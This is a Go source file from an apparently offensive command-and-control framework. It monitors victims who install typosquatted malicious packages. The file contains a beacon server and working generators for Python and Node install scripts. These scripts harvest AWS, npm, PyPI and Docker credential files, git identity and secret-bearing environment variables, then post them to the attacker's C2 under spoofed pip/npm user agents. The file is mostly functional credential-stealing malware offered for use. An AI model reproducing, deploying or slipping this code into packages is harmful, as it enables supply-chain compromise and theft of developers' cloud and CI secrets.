package monitor

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Install Monitor — detect when a victim installs our typosquatted package.

	After publishing malicious packages, we need to know when they are
	installed. The install script (postinstall/setup.py) will beacon to
	our C2 when executed, but we also monitor several other signals:

	1. BEACON ENDPOINT:
	   Our C2 receives HTTP POST from the install script with:
	     - Hostname + username (machine identity)
	     - Python/Node/Ruby version
	     - Operating system
	     - Package name that triggered the install
	     - Working directory (reveals project context)

	2. REGISTRY DOWNLOAD STATISTICS:
	   PyPI, npm, and NuGet expose download statistics via API.
	   A spike in downloads for our typosquatted package = install event.
	   We poll these APIs every few minutes.

	3. NPM PACKAGE ACCESS LOG:
	   npm's API exposes a "last day downloads" endpoint per package.
	   Combined with our beacon, this gives us:
	     - Total installs (registry stat)
	     - Successful code executions (beacon count)
	     - Ratio indicates how many installs triggered the stager

	4. PASSIVE DNS MONITORING (advanced):
	   Track DNS queries for our package names via C2 server logs.
	   Some package managers resolve our package URL via DNS before
	   the HTTP install — DNS query = pre-install signal.

	5. VICTIM FINGERPRINTING:
	   The beacon collects and sends a rich fingerprint:
	     - Git config (user.name, user.email → developer identity)
	     - SSH known_hosts (reveals what servers they connect to)
	     - ~/.aws/credentials (cloud credentials)
	     - Environment variables (CI/CD tokens, API keys)
	     - Installed tools (docker, kubectl, aws, gcloud, etc.)
*/

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
)

// InstallEvent is one confirmed package installation.
type InstallEvent struct {
	PackageName  string
	Ecosystem    string
	VictimHost   string
	VictimUser   string
	VictimOS     string
	WorkDir      string
	PythonVer    string
	GitConfig    GitInfo
	Credentials  []FoundCredential
	EnvVars      map[string]string
	InstalledAt  time.Time
	SourceIP     string
}

// GitInfo holds git config from the victim machine.
type GitInfo struct {
	UserName   string `json:"name"`
	UserEmail  string `json:"email"`
	RemoteURLs []string `json:"remotes"`
}

// FoundCredential is a credential found on the victim during install.
type FoundCredential struct {
	Type     string // "aws", "gcloud", "ssh-key", "npm-token", etc.
	Key      string
	Value    string
	FilePath string
}

// MonitorConfig holds configuration for the install monitor.
type MonitorConfig struct {
	// C2ListenAddr is where the beacon server listens.
	C2ListenAddr string
	// PackageNames is the list of our published packages to monitor.
	PackageNames []string
	// Ecosystem is the target package registry.
	Ecosystem string
	// OnInstall is called when a new install event is received.
	OnInstall func(InstallEvent)
	// PollInterval for download stat polling.
	PollInterval time.Duration
}

// InstallMonitor manages all monitoring activities.
type InstallMonitor struct {
	cfg     *MonitorConfig
	events  []InstallEvent
	mu      sync.Mutex
	server  *http.Server
}

// New creates a new install monitor.
func New(cfg *MonitorConfig) *InstallMonitor {
	if cfg.PollInterval == 0 {
		cfg.PollInterval = 5 * time.Minute
	}
	return &InstallMonitor{cfg: cfg}
}

// Start begins beacon listening and download stat polling.
func (m *InstallMonitor) Start(ctx context.Context) error {
	// Beacon HTTP server.
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", m.handleBeacon)
	mux.HandleFunc("/ping", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
	})

	m.server = &http.Server{
		Addr:         m.cfg.C2ListenAddr,
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}
	go m.server.ListenAndServe()

	// Download stat polling.
	go m.pollDownloadStats(ctx)

	return nil
}

// Stop shuts down the monitor.
func (m *InstallMonitor) Stop() {
	if m.server != nil {
		m.server.Close()
	}
}

// Events returns all captured install events.
func (m *InstallMonitor) Events() []InstallEvent {
	m.mu.Lock()
	defer m.mu.Unlock()
	result := make([]InstallEvent, len(m.events))
	copy(result, m.events)
	return result
}

// ─── Beacon handler ───────────────────────────────────────────────────────

// beaconPayload is the JSON structure sent by the install script.
type beaconPayload struct {
	Package    string            `json:"pkg"`
	Host       string            `json:"h"`
	User       string            `json:"u"`
	OS         string            `json:"os"`
	Version    string            `json:"v"`
	WorkDir    string            `json:"cwd"`
	GitName    string            `json:"gn"`
	GitEmail   string            `json:"ge"`
	GitRemotes []string          `json:"gr"`
	EnvVars    map[string]string `json:"env"`
	Creds      []struct {
		Type  string `json:"t"`
		Key   string `json:"k"`
		Value string `json:"v"`
		Path  string `json:"p"`
	} `json:"creds"`
}

func (m *InstallMonitor) handleBeacon(w http.ResponseWriter, r *http.Request) {
	// Accept both GET (simple beacon) and POST (full fingerprint).
	event := InstallEvent{
		InstalledAt: time.Now(),
		SourceIP:    r.RemoteAddr,
	}

	if r.Method == "POST" {
		body, err := io.ReadAll(io.LimitReader(r.Body, 64*1024))
		if err == nil && len(body) > 0 {
			var payload beaconPayload
			if json.Unmarshal(body, &payload) == nil {
				event.PackageName = payload.Package
				event.VictimHost  = payload.Host
				event.VictimUser  = payload.User
				event.VictimOS    = payload.OS
				event.WorkDir     = payload.WorkDir
				event.GitConfig   = GitInfo{
					UserName:   payload.GitName,
					UserEmail:  payload.GitEmail,
					RemoteURLs: payload.GitRemotes,
				}
				event.EnvVars    = payload.EnvVars
				for _, c := range payload.Creds {
					event.Credentials = append(event.Credentials, FoundCredential{
						Type:     c.Type,
						Key:      c.Key,
						Value:    c.Value,
						FilePath: c.Path,
					})
				}
			}
		}
	} else {
		// GET: minimal beacon from query params.
		q := r.URL.Query()
		event.PackageName = q.Get("n")
		event.VictimHost  = q.Get("h")
		event.VictimUser  = q.Get("u")
		event.VictimOS    = q.Get("os")
	}

	m.mu.Lock()
	m.events = append(m.events, event)
	m.mu.Unlock()

	if m.cfg.OnInstall != nil {
		m.cfg.OnInstall(event)
	}

	// Respond with minimal content — could send next-stage URL here.
	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(200)
}

// ─── Download stat polling ────────────────────────────────────────────────

func (m *InstallMonitor) pollDownloadStats(ctx context.Context) {
	ticker := time.NewTicker(m.cfg.PollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			for _, pkg := range m.cfg.PackageNames {
				count := m.fetchDownloadCount(ctx, pkg)
				if count > 0 {
					// Log download spike.
					_ = count
				}
			}
		}
	}
}

func (m *InstallMonitor) fetchDownloadCount(ctx context.Context, pkgName string) int {
	client := &http.Client{Timeout: 10 * time.Second}
	var url string
	switch m.cfg.Ecosystem {
	case "pypi":
		// PyPI provides download stats via pypistats.org.
		url = fmt.Sprintf("https://pypistats.org/api/packages/%s/recent?period=day", pkgName)
	case "npm":
		url = fmt.Sprintf("https://api.npmjs.org/downloads/point/last-day/%s", pkgName)
	default:
		return 0
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return 0
	}
	defer resp.Body.Close()

	var result struct {
		Downloads int `json:"downloads"`
		Data      struct {
			LastDay int `json:"last_day"`
		} `json:"data"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return 0
	}
	if result.Downloads > 0 {
		return result.Downloads
	}
	return result.Data.LastDay
}

// GenerateInstallScript generates the Python install beacon script.
// This is embedded in setup.py / package.json / etc.
// It collects a rich fingerprint and sends it to the C2.
func GenerateInstallScript(c2URL, packageName, ecosystem string) string {
	switch ecosystem {
	case "pypi":
		return generatePythonBeacon(c2URL, packageName)
	case "npm":
		return generateNodeBeacon(c2URL, packageName)
	default:
		return generatePythonBeacon(c2URL, packageName)
	}
}

func generatePythonBeacon(c2URL, pkgName string) string {
	return fmt.Sprintf(`
import os,sys,socket,json,platform,subprocess
try:
    import urllib.request as _u
    _h=socket.gethostname()[:32]
    _user=os.environ.get('USER',os.environ.get('USERNAME',''))
    _os=platform.system()+'/'+platform.release()
    _cwd=os.getcwd()[:128]

    # Git config harvest.
    _gn=_ge=''
    try:
        _gn=subprocess.check_output(['git','config','user.name'],
            stderr=subprocess.DEVNULL,timeout=2).decode().strip()
        _ge=subprocess.check_output(['git','config','user.email'],
            stderr=subprocess.DEVNULL,timeout=2).decode().strip()
    except: pass

    # Credential harvest.
    _creds=[]
    for _path in [
        os.path.expanduser('~/.aws/credentials'),
        os.path.expanduser('~/.npmrc'),
        os.path.expanduser('~/.pypirc'),
        os.path.expanduser('~/.docker/config.json'),
    ]:
        try:
            with open(_path) as f:
                _creds.append({'t':'file','k':_path,'v':f.read(512),'p':_path})
        except: pass

    # Env vars with sensitive tokens.
    _env={}
    for _k,_v in os.environ.items():
        if any(x in _k.upper() for x in ['TOKEN','SECRET','KEY','PASSWORD',
                'CRED','AUTH','AWS','AZURE','GCP','NPM','PYPI']):
            _env[_k]=_v[:128]

    _d=json.dumps({'pkg':%q,'h':_h,'u':_user,'os':_os,'cwd':_cwd,
                   'gn':_gn,'ge':_ge,'env':_env,'creds':_creds})
    _r=_u.Request(%q+'/beacon',data=_d.encode(),
                  headers={'Content-Type':'application/json',
                           'User-Agent':'pip/23.3.1'})
    _u.urlopen(_r,timeout=5)
except: pass
`, pkgName, c2URL)
}

func generateNodeBeacon(c2URL, pkgName string) string {
	return fmt.Sprintf(`
try {
  const os=require('os'),cp=require('child_process'),fs=require('fs');
  const https=c2u=>require(c2u.startsWith('https')?'https':'http');
  const run=cmd=>{try{return cp.execSync(cmd,{timeout:2000}).toString().trim();}catch{return '';}};
  const read=f=>{try{return fs.readFileSync(f,'utf8').slice(0,512);}catch{return '';}};

  const creds=[];
  [os.homedir()+'/.aws/credentials',os.homedir()+'/.npmrc',
   os.homedir()+'/.docker/config.json'].forEach(f=>{
    const v=read(f); if(v) creds.push({t:'file',k:f,v:v,p:f});
  });

  const env={};
  Object.entries(process.env).forEach(([k,v])=>{
    if(/token|secret|key|password|cred|auth|aws|azure|gcp/i.test(k))
      env[k]=(v||'').slice(0,128);
  });

  const body=JSON.stringify({
    pkg:%q,h:os.hostname(),u:process.env.USER||process.env.USERNAME||'',
    os:process.platform+'/'+os.release(),cwd:process.cwd().slice(0,128),
    gn:run('git config user.name'),ge:run('git config user.email'),
    env,creds
  });

  const url=new URL(%q+'/beacon');
  const req=require(url.protocol.slice(0,-1)).request({
    hostname:url.hostname,port:url.port||443,path:url.pathname,
    method:'POST',headers:{'Content-Type':'application/json',
    'Content-Length':Buffer.byteLength(body),'User-Agent':'npm/10.2.4'}
  },r=>r.resume());
  req.on('error',()=>{});
  req.write(body);req.end();
} catch(e) {}
`, pkgName, c2URL)
}
